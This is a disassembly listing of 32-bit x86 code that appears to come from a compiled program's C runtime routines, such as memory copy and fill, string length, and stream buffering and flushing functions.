  42de1e:	inc    edx
  42de1f:	add    BYTE PTR [ebx],ah
  42de21:	ror    DWORD PTR [edx-0x75f877fa],1
  42de27:	inc    esi
  42de28:	add    DWORD PTR [eax+0x468a0147],ecx
  42de2e:	add    al,cl
  42de30:	jmp    0x28a6637
  42de35:	add    esi,0x3
  42de38:	add    edi,0x3
  42de3b:	cmp    ecx,0x8
  42de3e:	jb     0x42de0c
  42de40:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de42:	jmp    DWORD PTR [edx*4+0x42defc]
  42de49:	lea    ecx,[ecx+0x0]
  42de4c:	and    edx,ecx
  42de4e:	mov    al,BYTE PTR [esi]
  42de50:	mov    BYTE PTR [edi],al
  42de52:	mov    al,BYTE PTR [esi+0x1]
  42de55:	shr    ecx,0x2
  42de58:	mov    BYTE PTR [edi+0x1],al
  42de5b:	add    esi,0x2
  42de5e:	add    edi,0x2
  42de61:	cmp    ecx,0x8
  42de64:	jb     0x42de0c
  42de66:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de68:	jmp    DWORD PTR [edx*4+0x42defc]
  42de6f:	nop
  42de70:	and    edx,ecx
  42de72:	mov    al,BYTE PTR [esi]
  42de74:	mov    BYTE PTR [edi],al
  42de76:	add    esi,0x1
  42de79:	shr    ecx,0x2
  42de7c:	add    edi,0x1
  42de7f:	cmp    ecx,0x8
  42de82:	jb     0x42de0c
  42de84:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de86:	jmp    DWORD PTR [edx*4+0x42defc]
  42de8d:	lea    ecx,[ecx+0x0]
  42de90:	repz fiadd WORD PTR [edx+0x0]
  42de94:	loopne 0x42de74
  42de96:	inc    edx
  42de97:	add    al,bl
  42de99:	fiadd  WORD PTR [edx+0x0]
  42de9c:	rcr    dh,1
  42de9e:	inc    edx
  42de9f:	add    al,cl
  42dea1:	fiadd  WORD PTR [edx+0x0]
  42dea4:	rcr    dh,0x42
  42dea7:	add    BYTE PTR [eax-0x4fffbd22],bh
  42dead:	fiadd  WORD PTR [edx+0x0]
  42deb0:	mov    eax,DWORD PTR [esi+ecx*4-0x1c]
  42deb4:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  42deb8:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42debc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  42dec0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  42dec4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  42dec8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42decc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  42ded0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  42ded4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  42ded8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42dedc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  42dee0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  42dee4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  42dee8:	lea    eax,[ecx*4+0x0]
  42deef:	add    esi,eax
  42def1:	add    edi,eax
  42def3:	jmp    DWORD PTR [edx*4+0x42defc]
  42defa:	mov    edi,edi
  42defc:	or     al,0xdf
  42defe:	inc    edx
  42deff:	add    BYTE PTR [edi+ebx*8],dl
  42df02:	inc    edx
  42df03:	add    BYTE PTR [eax],ah
  42df05:	fild   WORD PTR [edx+0x0]
  42df08:	xor    al,0xdf
  42df0a:	inc    edx
  42df0b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42df11:	leave  
  42df12:	ret    
  42df13:	nop
  42df14:	mov    al,BYTE PTR [esi]
  42df16:	mov    BYTE PTR [edi],al
  42df18:	mov    eax,DWORD PTR [ebp+0x8]
  42df1b:	pop    esi
  42df1c:	pop    edi
  42df1d:	leave  
  42df1e:	ret    
  42df1f:	nop
  42df20:	mov    al,BYTE PTR [esi]
  42df22:	mov    BYTE PTR [edi],al
  42df24:	mov    al,BYTE PTR [esi+0x1]
  42df27:	mov    BYTE PTR [edi+0x1],al
  42df2a:	mov    eax,DWORD PTR [ebp+0x8]
  42df2d:	pop    esi
  42df2e:	pop    edi
  42df2f:	leave  
  42df30:	ret    
  42df31:	lea    ecx,[ecx+0x0]
  42df34:	mov    al,BYTE PTR [esi]
  42df36:	mov    BYTE PTR [edi],al
  42df38:	mov    al,BYTE PTR [esi+0x1]
  42df3b:	mov    BYTE PTR [edi+0x1],al
  42df3e:	mov    al,BYTE PTR [esi+0x2]
  42df41:	mov    BYTE PTR [edi+0x2],al
  42df44:	mov    eax,DWORD PTR [ebp+0x8]
  42df47:	pop    esi
  42df48:	pop    edi
  42df49:	leave  
  42df4a:	ret    
  42df4b:	nop
  42df4c:	lea    esi,[ecx+esi*1-0x4]
  42df50:	lea    edi,[ecx+edi*1-0x4]
  42df54:	test   edi,0x3
  42df5a:	jne    0x42df80
  42df5c:	shr    ecx,0x2
  42df5f:	and    edx,0x3
  42df62:	cmp    ecx,0x8
  42df65:	jb     0x42df74
  42df67:	std    
  42df68:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df6a:	cld    
  42df6b:	jmp    DWORD PTR [edx*4+0x42e098]
  42df72:	mov    edi,edi
  42df74:	neg    ecx
  42df76:	jmp    DWORD PTR [ecx*4+0x42e048]
  42df7d:	lea    ecx,[ecx+0x0]
  42df80:	mov    eax,edi
  42df82:	mov    edx,0x3
  42df87:	cmp    ecx,0x4
  42df8a:	jb     0x42df98
  42df8c:	and    eax,0x3
  42df8f:	sub    ecx,eax
  42df91:	jmp    DWORD PTR [eax*4+0x42df9c]
  42df98:	jmp    DWORD PTR [ecx*4+0x42e098]
  42df9f:	nop
  42dfa0:	lods   al,BYTE PTR ds:[esi]
  42dfa1:	fild   WORD PTR [edx+0x0]
  42dfa4:	rcr    bh,1
  42dfa6:	inc    edx
  42dfa7:	add    al,bh
  42dfa9:	fild   WORD PTR [edx+0x0]
  42dfac:	mov    al,BYTE PTR [esi+0x3]
  42dfaf:	and    edx,ecx
  42dfb1:	mov    BYTE PTR [edi+0x3],al
  42dfb4:	sub    esi,0x1
  42dfb7:	shr    ecx,0x2
  42dfba:	sub    edi,0x1
  42dfbd:	cmp    ecx,0x8
  42dfc0:	jb     0x42df74
  42dfc2:	std    
  42dfc3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfc5:	cld    
  42dfc6:	jmp    DWORD PTR [edx*4+0x42e098]
  42dfcd:	lea    ecx,[ecx+0x0]
  42dfd0:	mov    al,BYTE PTR [esi+0x3]
  42dfd3:	and    edx,ecx
  42dfd5:	mov    BYTE PTR [edi+0x3],al
  42dfd8:	mov    al,BYTE PTR [esi+0x2]
  42dfdb:	shr    ecx,0x2
  42dfde:	mov    BYTE PTR [edi+0x2],al
  42dfe1:	sub    esi,0x2
  42dfe4:	sub    edi,0x2
  42dfe7:	cmp    ecx,0x8
  42dfea:	jb     0x42df74
  42dfec:	std    
  42dfed:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfef:	cld    
  42dff0:	jmp    DWORD PTR [edx*4+0x42e098]
  42dff7:	nop
  42dff8:	mov    al,BYTE PTR [esi+0x3]
  42dffb:	and    edx,ecx
  42dffd:	mov    BYTE PTR [edi+0x3],al
  42e000:	mov    al,BYTE PTR [esi+0x2]
  42e003:	mov    BYTE PTR [edi+0x2],al
  42e006:	mov    al,BYTE PTR [esi+0x1]
  42e009:	shr    ecx,0x2
  42e00c:	mov    BYTE PTR [edi+0x1],al
  42e00f:	sub    esi,0x3
  42e012:	sub    edi,0x3
  42e015:	cmp    ecx,0x8
  42e018:	jb     0x42df74
  42e01e:	std    
  42e01f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e021:	cld    
  42e022:	jmp    DWORD PTR [edx*4+0x42e098]
  42e029:	lea    ecx,[ecx+0x0]
  42e02c:	dec    esp
  42e02d:	loopne 0x42e071
  42e02f:	add    BYTE PTR [eax+eiz*8+0x42],dl
  42e033:	add    BYTE PTR [eax+eiz*8+0x42],bl
  42e037:	add    BYTE PTR [eax+eiz*8+0x42],ah
  42e03b:	add    BYTE PTR [eax+eiz*8+0x42],ch
  42e03f:	add    BYTE PTR [eax+eiz*8+0x42],dh
  42e043:	add    BYTE PTR [eax+eiz*8+0x42],bh
  42e047:	add    BYTE PTR [edi-0x74ffbd20],cl
  42e04d:	inc    esp
  42e04e:	mov    ds,WORD PTR [ecx+ecx*4]
  42e051:	inc    esp
  42e052:	(bad)  
  42e053:	sbb    al,0x8b
  42e055:	inc    esp
  42e056:	mov    ds,WORD PTR [eax]
  42e058:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42e05c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  42e060:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  42e064:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  42e068:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42e06c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  42e070:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  42e074:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  42e078:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42e07c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  42e080:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  42e084:	lea    eax,[ecx*4+0x0]
  42e08b:	add    esi,eax
  42e08d:	add    edi,eax
  42e08f:	jmp    DWORD PTR [edx*4+0x42e098]
  42e096:	mov    edi,edi
  42e098:	test   al,0xe0
  42e09a:	inc    edx
  42e09b:	add    BYTE PTR [eax-0x3fffbd20],dh
  42e0a1:	loopne 0x42e0e5
  42e0a3:	add    ah,dl
  42e0a5:	loopne 0x42e0e9
  42e0a7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42e0ad:	leave  
  42e0ae:	ret    
  42e0af:	nop
  42e0b0:	mov    al,BYTE PTR [esi+0x3]
  42e0b3:	mov    BYTE PTR [edi+0x3],al
  42e0b6:	mov    eax,DWORD PTR [ebp+0x8]
  42e0b9:	pop    esi
  42e0ba:	pop    edi
  42e0bb:	leave  
  42e0bc:	ret    
  42e0bd:	lea    ecx,[ecx+0x0]
  42e0c0:	mov    al,BYTE PTR [esi+0x3]
  42e0c3:	mov    BYTE PTR [edi+0x3],al
  42e0c6:	mov    al,BYTE PTR [esi+0x2]
  42e0c9:	mov    BYTE PTR [edi+0x2],al
  42e0cc:	mov    eax,DWORD PTR [ebp+0x8]
  42e0cf:	pop    esi
  42e0d0:	pop    edi
  42e0d1:	leave  
  42e0d2:	ret    
  42e0d3:	nop
  42e0d4:	mov    al,BYTE PTR [esi+0x3]
  42e0d7:	mov    BYTE PTR [edi+0x3],al
  42e0da:	mov    al,BYTE PTR [esi+0x2]
  42e0dd:	mov    BYTE PTR [edi+0x2],al
  42e0e0:	mov    al,BYTE PTR [esi+0x1]
  42e0e3:	mov    BYTE PTR [edi+0x1],al
  42e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  42e0e9:	pop    esi
  42e0ea:	pop    edi
  42e0eb:	leave  
  42e0ec:	ret    
  42e0ed:	push   0xc
  42e0ef:	push   0x4393e8
  42e0f4:	call   0x431210
  42e0f9:	mov    esi,DWORD PTR [ebp+0x8]
  42e0fc:	test   esi,esi
  42e0fe:	je     0x42e158
  42e100:	cmp    DWORD PTR ds:0x465234,0x3
  42e107:	jne    0x42e149
  42e109:	push   0x4
  42e10b:	call   0x431126
  42e110:	pop    ecx
  42e111:	and    DWORD PTR [ebp-0x4],0x0
  42e115:	push   esi
  42e116:	call   0x431564
  42e11b:	pop    ecx
  42e11c:	mov    DWORD PTR [ebp-0x1c],eax
  42e11f:	test   eax,eax
  42e121:	je     0x42e12c
  42e123:	push   esi
  42e124:	push   eax
  42e125:	call   0x43158f
  42e12a:	pop    ecx
  42e12b:	pop    ecx
  42e12c:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e130:	call   0x42e140
  42e135:	cmp    DWORD PTR [ebp-0x1c],0x0
  42e139:	jne    0x42e158
  42e13b:	push   DWORD PTR [ebp+0x8]
  42e13e:	jmp    0x42e14a
  42e140:	push   0x4
  42e142:	call   0x431071
  42e147:	pop    ecx
  42e148:	ret    
  42e149:	push   esi
  42e14a:	push   0x0
  42e14c:	push   DWORD PTR ds:0x465230
  42e152:	call   DWORD PTR ds:0x439014
  42e158:	call   0x43124b
  42e15d:	ret    
  42e15e:	int3   
  42e15f:	int3   
  42e160:	mov    ecx,DWORD PTR [esp+0x4]
  42e164:	test   ecx,0x3
  42e16a:	je     0x42e190
  42e16c:	mov    al,BYTE PTR [ecx]
  42e16e:	add    ecx,0x1
  42e171:	test   al,al
  42e173:	je     0x42e1c3
  42e175:	test   ecx,0x3
  42e17b:	jne    0x42e16c
  42e17d:	add    eax,0x0
  42e182:	lea    esp,[esp+0x0]
  42e189:	lea    esp,[esp+0x0]
  42e190:	mov    eax,DWORD PTR [ecx]
  42e192:	mov    edx,0x7efefeff
  42e197:	add    edx,eax
  42e199:	xor    eax,0xffffffff
  42e19c:	xor    eax,edx
  42e19e:	add    ecx,0x4
  42e1a1:	test   eax,0x81010100
  42e1a6:	je     0x42e190
  42e1a8:	mov    eax,DWORD PTR [ecx-0x4]
  42e1ab:	test   al,al
  42e1ad:	je     0x42e1e1
  42e1af:	test   ah,ah
  42e1b1:	je     0x42e1d7
  42e1b3:	test   eax,0xff0000
  42e1b8:	je     0x42e1cd
  42e1ba:	test   eax,0xff000000
  42e1bf:	je     0x42e1c3
  42e1c1:	jmp    0x42e190
  42e1c3:	lea    eax,[ecx-0x1]
  42e1c6:	mov    ecx,DWORD PTR [esp+0x4]
  42e1ca:	sub    eax,ecx
  42e1cc:	ret    
  42e1cd:	lea    eax,[ecx-0x2]
  42e1d0:	mov    ecx,DWORD PTR [esp+0x4]
  42e1d4:	sub    eax,ecx
  42e1d6:	ret    
  42e1d7:	lea    eax,[ecx-0x3]
  42e1da:	mov    ecx,DWORD PTR [esp+0x4]
  42e1de:	sub    eax,ecx
  42e1e0:	ret    
  42e1e1:	lea    eax,[ecx-0x4]
  42e1e4:	mov    ecx,DWORD PTR [esp+0x4]
  42e1e8:	sub    eax,ecx
  42e1ea:	ret    
  42e1eb:	push   ebx
  42e1ec:	mov    ebx,DWORD PTR [esp+0x8]
  42e1f0:	cmp    ebx,0xffffffff
  42e1f3:	push   esi
  42e1f4:	je     0x42e237
  42e1f6:	mov    esi,DWORD PTR [esp+0x10]
  42e1fa:	mov    eax,DWORD PTR [esi+0xc]
  42e1fd:	test   al,0x1
  42e1ff:	jne    0x42e209
  42e201:	test   al,al
  42e203:	jns    0x42e237
  42e205:	test   al,0x2
  42e207:	jne    0x42e237
  42e209:	cmp    DWORD PTR [esi+0x8],0x0
  42e20d:	jne    0x42e216
  42e20f:	push   esi
  42e210:	call   0x43203f
  42e215:	pop    ecx
  42e216:	mov    eax,DWORD PTR [esi]
  42e218:	cmp    eax,DWORD PTR [esi+0x8]
  42e21b:	jne    0x42e226
  42e21d:	cmp    DWORD PTR [esi+0x4],0x0
  42e221:	jne    0x42e237
  42e223:	inc    eax
  42e224:	mov    DWORD PTR [esi],eax
  42e226:	dec    DWORD PTR [esi]
  42e228:	test   BYTE PTR [esi+0xc],0x40
  42e22c:	mov    eax,DWORD PTR [esi]
  42e22e:	je     0x42e23d
  42e230:	cmp    BYTE PTR [eax],bl
  42e232:	je     0x42e23f
  42e234:	inc    eax
  42e235:	mov    DWORD PTR [esi],eax
  42e237:	or     eax,0xffffffff
  42e23a:	pop    esi
  42e23b:	pop    ebx
  42e23c:	ret    
  42e23d:	mov    BYTE PTR [eax],bl
  42e23f:	mov    eax,DWORD PTR [esi+0xc]
  42e242:	inc    DWORD PTR [esi+0x4]
  42e245:	and    eax,0xffffffef
  42e248:	or     eax,0x1
  42e24b:	mov    DWORD PTR [esi+0xc],eax
  42e24e:	mov    eax,ebx
  42e250:	and    eax,0xff
  42e255:	jmp    0x42e23a
  42e257:	push   0xc
  42e259:	push   0x4393f8
  42e25e:	call   0x431210
  42e263:	push   DWORD PTR [ebp+0xc]
  42e266:	call   0x42f3b5
  42e26b:	pop    ecx
  42e26c:	and    DWORD PTR [ebp-0x4],0x0
  42e270:	push   DWORD PTR [ebp+0xc]
  42e273:	push   DWORD PTR [ebp+0x8]
  42e276:	call   0x42e1eb
  42e27b:	pop    ecx
  42e27c:	pop    ecx
  42e27d:	mov    DWORD PTR [ebp-0x1c],eax
  42e280:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e284:	call   0x42e292
  42e289:	mov    eax,DWORD PTR [ebp-0x1c]
  42e28c:	call   0x43124b
  42e291:	ret    
  42e292:	push   DWORD PTR [ebp+0xc]
  42e295:	call   0x42f407
  42e29a:	pop    ecx
  42e29b:	ret    
  42e29c:	push   DWORD PTR [esp+0x4]
  42e2a0:	call   0x432218
  42e2a5:	pop    ecx
  42e2a6:	mov    ecx,DWORD PTR [esp+0x8]
  42e2aa:	mov    DWORD PTR [ecx+0x4],edx
  42e2ad:	mov    edx,eax
  42e2af:	and    edx,DWORD PTR [ecx+0x4]
  42e2b2:	mov    DWORD PTR [ecx],eax
  42e2b4:	or     eax,0xffffffff
  42e2b7:	cmp    edx,eax
  42e2b9:	je     0x42e2bd
  42e2bb:	xor    eax,eax
  42e2bd:	ret    
  42e2be:	push   ebx
  42e2bf:	push   esi
  42e2c0:	mov    esi,DWORD PTR [esp+0xc]
  42e2c4:	mov    eax,DWORD PTR [esi+0xc]
  42e2c7:	mov    ecx,eax
  42e2c9:	and    cl,0x3
  42e2cc:	xor    ebx,ebx
  42e2ce:	cmp    cl,0x2
  42e2d1:	jne    0x42e30d
  42e2d3:	test   ax,0x108
  42e2d7:	je     0x42e30d
  42e2d9:	mov    eax,DWORD PTR [esi+0x8]
  42e2dc:	push   edi
  42e2dd:	mov    edi,DWORD PTR [esi]
  42e2df:	sub    edi,eax
  42e2e1:	test   edi,edi
  42e2e3:	jle    0x42e30c
  42e2e5:	push   edi
  42e2e6:	push   eax
  42e2e7:	push   DWORD PTR [esi+0x10]
  42e2ea:	call   0x43242d
  42e2ef:	add    esp,0xc
  42e2f2:	cmp    eax,edi
  42e2f4:	jne    0x42e305
  42e2f6:	mov    eax,DWORD PTR [esi+0xc]
  42e2f9:	test   al,al
  42e2fb:	jns    0x42e30c
  42e2fd:	and    eax,0xfffffffd
  42e300:	mov    DWORD PTR [esi+0xc],eax
  42e303:	jmp    0x42e30c
  42e305:	or     DWORD PTR [esi+0xc],0x20
  42e309:	or     ebx,0xffffffff
  42e30c:	pop    edi
  42e30d:	mov    eax,DWORD PTR [esi+0x8]
  42e310:	and    DWORD PTR [esi+0x4],0x0
  42e314:	mov    DWORD PTR [esi],eax
  42e316:	pop    esi
  42e317:	mov    eax,ebx
  42e319:	pop    ebx
  42e31a:	ret    
  42e31b:	push   esi
  42e31c:	mov    esi,DWORD PTR [esp+0x8]
  42e320:	push   esi
  42e321:	call   0x42e2be
  42e326:	test   eax,eax
  42e328:	pop    ecx
  42e329:	je     0x42e330
  42e32b:	or     eax,0xffffffff
  42e32e:	pop    esi
  42e32f:	ret    
  42e330:	test   BYTE PTR [esi+0xd],0x40
  42e334:	je     0x42e345
  42e336:	push   DWORD PTR [esi+0x10]
  42e339:	call   0x4324d8
  42e33e:	pop    ecx
  42e33f:	neg    eax
  42e341:	sbb    eax,eax
  42e343:	pop    esi
  42e344:	ret    
  42e345:	xor    eax,eax
  42e347:	pop    esi
  42e348:	ret    
  42e349:	push   0x14
  42e34b:	push   0x439408
  42e350:	call   0x431210
  42e355:	xor    edi,edi
  42e357:	mov    DWORD PTR [ebp-0x1c],edi
  42e35a:	mov    DWORD PTR [ebp-0x24],edi
  42e35d:	push   0x1
  42e35f:	call   0x431126
  42e364:	pop    ecx
  42e365:	mov    DWORD PTR [ebp-0x4],edi
  42e368:	xor    esi,esi
  42e36a:	mov    DWORD PTR [ebp-0x20],esi
  42e36d:	cmp    esi,DWORD PTR ds:0x466260
  42e373:	jge    0x42e3fa
  42e379:	mov    eax,ds:0x465248
  42e37e:	mov    eax,DWORD PTR [eax+esi*4]
  42e381:	cmp    eax,edi
  42e383:	je     0x42e3e1
  42e385:	test   BYTE PTR [eax+0xc],0x83
  42e389:	je     0x42e3e1
  42e38b:	push   eax
  42e38c:	push   esi
  42e38d:	call   0x42f3e4
  42e392:	pop    ecx
  42e393:	pop    ecx
  42e394:	xor    edx,edx
  42e396:	inc    edx
  42e397:	mov    DWORD PTR [ebp-0x4],edx
  42e39a:	mov    eax,ds:0x465248
  42e39f:	mov    eax,DWORD PTR [eax+esi*4]
  42e3a2:	mov    ecx,DWORD PTR [eax+0xc]
  42e3a5:	test   cl,0x83
  42e3a8:	je     0x42e3d9
  42e3aa:	cmp    DWORD PTR [ebp+0x8],edx
  42e3ad:	jne    0x42e3c0
  42e3af:	push   eax
  42e3b0:	call   0x42e31b
  42e3b5:	pop    ecx
  42e3b6:	cmp    eax,0xffffffff
  42e3b9:	je     0x42e3d9
  42e3bb:	inc    DWORD PTR [ebp-0x1c]
  42e3be:	jmp    0x42e3d9
  42e3c0:	cmp    DWORD PTR [ebp+0x8],edi
  42e3c3:	jne    0x42e3d9
  42e3c5:	test   cl,0x2
  42e3c8:	je     0x42e3d9
  42e3ca:	push   eax
  42e3cb:	call   0x42e31b
  42e3d0:	pop    ecx
  42e3d1:	cmp    eax,0xffffffff
  42e3d4:	jne    0x42e3d9
  42e3d6:	or     DWORD PTR [ebp-0x24],eax
  42e3d9:	mov    DWORD PTR [ebp-0x4],edi
  42e3dc:	call   0x42e3e9
  42e3e1:	inc    esi
  42e3e2:	jmp    0x42e36a
  42e3e4:	xor    edi,edi
  42e3e6:	mov    esi,DWORD PTR [ebp-0x20]
  42e3e9:	mov    eax,ds:0x465248
  42e3ee:	push   DWORD PTR [eax+esi*4]
  42e3f1:	push   esi
  42e3f2:	call   0x42f436
  42e3f7:	pop    ecx
  42e3f8:	pop    ecx
  42e3f9:	ret    
  42e3fa:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e3fe:	call   0x42e415
  42e403:	cmp    DWORD PTR [ebp+0x8],0x1
  42e407:	mov    eax,DWORD PTR [ebp-0x1c]
  42e40a:	je     0x42e40f
  42e40c:	mov    eax,DWORD PTR [ebp-0x24]
  42e40f:	call   0x43124b
  42e414:	ret    
  42e415:	push   0x1
  42e417:	call   0x431071
  42e41c:	pop    ecx
  42e41d:	ret    
  42e41e:	push   0xc
  42e420:	push   0x439420
  42e425:	call   0x431210
  42e42a:	xor    esi,esi
  42e42c:	cmp    DWORD PTR [ebp+0x8],esi
  42e42f:	jne    0x42e43a
  42e431:	push   esi
  42e432:	call   0x42e349
  42e437:	pop    ecx
  42e438:	jmp    0x42e45e
  42e43a:	push   DWORD PTR [ebp+0x8]
  42e43d:	call   0x42f3b5
  42e442:	pop    ecx
  42e443:	mov    DWORD PTR [ebp-0x4],esi
  42e446:	push   DWORD PTR [ebp+0x8]
  42e449:	call   0x42e31b
  42e44e:	pop    ecx
  42e44f:	mov    DWORD PTR [ebp-0x1c],eax
  42e452:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e456:	call   0x42e464
  42e45b:	mov    eax,DWORD PTR [ebp-0x1c]
  42e45e:	call   0x43124b
  42e463:	ret    
  42e464:	push   DWORD PTR [ebp+0x8]
  42e467:	call   0x42f407
  42e46c:	pop    ecx
  42e46d:	ret    
  42e46e:	push   0x1
  42e470:	call   0x42e349
  42e475:	pop    ecx
  42e476:	ret    
  42e477:	push   0xc
  42e479:	push   0x439430
  42e47e:	call   0x431210
  42e483:	mov    esi,DWORD PTR [ebp+0x8]
  42e486:	push   esi
  42e487:	call   0x42f3b5
  42e48c:	pop    ecx
  42e48d:	and    DWORD PTR [ebp-0x4],0x0
  42e491:	dec    DWORD PTR [esi+0x4]
  42e494:	js     0x42e4a0
  42e496:	mov    ecx,DWORD PTR [esi]
  42e498:	movzx  eax,BYTE PTR [ecx]
  42e49b:	inc    ecx
  42e49c:	mov    DWORD PTR [esi],ecx
  42e49e:	jmp    0x42e4a7
  42e4a0:	push   esi
  42e4a1:	call   0x432594
  42e4a6:	pop    ecx
  42e4a7:	mov    DWORD PTR [ebp-0x1c],eax
  42e4aa:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e4ae:	call   0x42e4bf
  42e4b3:	mov    eax,DWORD PTR [ebp-0x1c]
  42e4b6:	call   0x43124b
  42e4bb:	ret    
  42e4bc:	mov    esi,DWORD PTR [ebp+0x8]
  42e4bf:	push   esi
  42e4c0:	call   0x42f407
  42e4c5:	pop    ecx
  42e4c6:	ret    
  42e4c7:	mov    eax,DWORD PTR [esp+0x8]
  42e4cb:	push   0x0
  42e4cd:	push   DWORD PTR [eax+0x4]
  42e4d0:	push   DWORD PTR [eax]
  42e4d2:	push   DWORD PTR [esp+0x10]
  42e4d6:	call   0x432708
  42e4db:	add    esp,0x10
  42e4de:	ret    
  42e4df:	int3   
  42e4e0:	mov    edx,DWORD PTR [esp+0xc]
  42e4e4:	mov    ecx,DWORD PTR [esp+0x4]
  42e4e8:	test   edx,edx
  42e4ea:	je     0x42e53b
  42e4ec:	xor    eax,eax
  42e4ee:	mov    al,BYTE PTR [esp+0x8]
  42e4f2:	push   edi
  42e4f3:	mov    edi,ecx
  42e4f5:	cmp    edx,0x4
  42e4f8:	jb     0x42e52b
  42e4fa:	neg    ecx
  42e4fc:	and    ecx,0x3
  42e4ff:	je     0x42e50d
  42e501:	sub    edx,ecx
  42e503:	mov    BYTE PTR [edi],al
  42e505:	add    edi,0x1
  42e508:	sub    ecx,0x1
  42e50b:	jne    0x42e503
  42e50d:	mov    ecx,eax
  42e50f:	shl    eax,0x8
  42e512:	add    eax,ecx
  42e514:	mov    ecx,eax
  42e516:	shl    eax,0x10
  42e519:	add    eax,ecx
  42e51b:	mov    ecx,edx
  42e51d:	and    edx,0x3
  42e520:	shr    ecx,0x2
  42e523:	je     0x42e52b
  42e525:	rep stos DWORD PTR es:[edi],eax
  42e527:	test   edx,edx
  42e529:	je     0x42e535
  42e52b:	mov    BYTE PTR [edi],al
  42e52d:	add    edi,0x1
  42e530:	sub    edx,0x1
  42e533:	jne    0x42e52b
  42e535:	mov    eax,DWORD PTR [esp+0x8]
  42e539:	pop    edi
  42e53a:	ret    
  42e53b:	mov    eax,DWORD PTR [esp+0x4]
  42e53f:	ret    
  42e540:	push   0x10
  42e542:	push   0x439440
  42e547:	call   0x431210
  42e54c:	xor    edi,edi
  42e54e:	mov    DWORD PTR [ebp-0x1c],edi
  42e551:	mov    ebx,DWORD PTR [ebp+0x10]
  42e554:	cmp    ebx,0x4
  42e557:	je     0x42e579
  42e559:	cmp    DWORD PTR [ebp+0x14],0x2
  42e55d:	jb     0x42e571
  42e55f:	cmp    DWORD PTR [ebp+0x14],0x7fffffff
  42e566:	ja     0x42e571
  42e568:	cmp    ebx,edi
  42e56a:	je     0x42e579
  42e56c:	cmp    ebx,0x40
  42e56f:	je     0x42e579
  42e571:	or     eax,0xffffffff
  42e574:	jmp    0x42e60c
  42e579:	and    DWORD PTR [ebp+0x14],0xfffffffe
  42e57d:	mov    esi,DWORD PTR [ebp+0x8]
  42e580:	mov    DWORD PTR [ebp-0x20],esi
  42e583:	push   esi
  42e584:	call   0x42f3b5
  42e589:	pop    ecx
  42e58a:	mov    DWORD PTR [ebp-0x4],edi
  42e58d:	push   esi
  42e58e:	call   0x42e2be
  42e593:	push   esi
  42e594:	call   0x432754
  42e599:	pop    ecx
  42e59a:	pop    ecx
  42e59b:	and    WORD PTR [esi+0xc],0xc2f3
  42e5a1:	mov    ecx,DWORD PTR [esi+0xc]
  42e5a4:	test   bl,0x4
  42e5a7:	je     0x42e5be
  42e5a9:	or     ecx,0x4
  42e5ac:	mov    DWORD PTR [esi+0xc],ecx
  42e5af:	lea    eax,[esi+0x14]
  42e5b2:	mov    DWORD PTR [ebp+0xc],eax
  42e5b5:	mov    DWORD PTR [ebp+0x14],0x2
  42e5bc:	jmp    0x42e5f2
  42e5be:	mov    eax,DWORD PTR [ebp+0xc]
  42e5c1:	cmp    eax,edi
  42e5c3:	jne    0x42e5e9
  42e5c5:	push   DWORD PTR [ebp+0x14]
  42e5c8:	call   0x4311fe
  42e5cd:	pop    ecx
  42e5ce:	mov    DWORD PTR [ebp+0xc],eax
  42e5d1:	cmp    eax,edi
  42e5d3:	jne    0x42e5e1
  42e5d5:	inc    DWORD PTR ds:0x43fb44
  42e5db:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42e5df:	jmp    0x42e600
  42e5e1:	or     WORD PTR [esi+0xc],0x408
  42e5e7:	jmp    0x42e5f2
  42e5e9:	or     ecx,0x500
  42e5ef:	mov    DWORD PTR [esi+0xc],ecx
  42e5f2:	mov    ecx,DWORD PTR [ebp+0x14]
  42e5f5:	mov    DWORD PTR [esi+0x18],ecx
  42e5f8:	mov    DWORD PTR [esi+0x8],eax
  42e5fb:	mov    DWORD PTR [esi],eax
  42e5fd:	mov    DWORD PTR [esi+0x4],edi
  42e600:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e604:	call   0x42e612
  42e609:	mov    eax,DWORD PTR [ebp-0x1c]
  42e60c:	call   0x43124b
  42e611:	ret    
  42e612:	push   DWORD PTR [ebp-0x20]
  42e615:	call   0x42f407
  42e61a:	pop    ecx
  42e61b:	ret    
  42e61c:	jmp    0x42e750
  42e621:	mov    eax,ecx
  42e623:	and    DWORD PTR [eax+0x4],0x0
  42e627:	and    DWORD PTR [eax+0x8],0x0
